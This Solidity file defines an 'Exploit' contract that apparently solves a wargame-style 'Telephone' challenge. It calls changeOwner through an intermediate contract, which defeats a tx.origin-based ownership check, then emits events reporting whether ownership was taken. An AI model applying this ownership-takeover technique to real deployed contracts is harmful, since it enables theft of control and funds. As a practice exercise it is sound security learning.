// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract Exploit {
    Telephone public telephone;

    event _succeed(address owner);
    event _fail(address owner);
    event _owner(address owner);

    constructor(address _telephone) {
        telephone = Telephone(payable(_telephone));
    }

    function attack() public {
        address owner = telephone.owner();
        emit _owner(owner);
        telephone.changeOwner(msg.sender);
        address changedOwner = telephone.owner();
        if (changedOwner == msg.sender) {
            emit _succeed(changedOwner);
        } else {
            emit _fail(changedOwner);
        }
    }
}
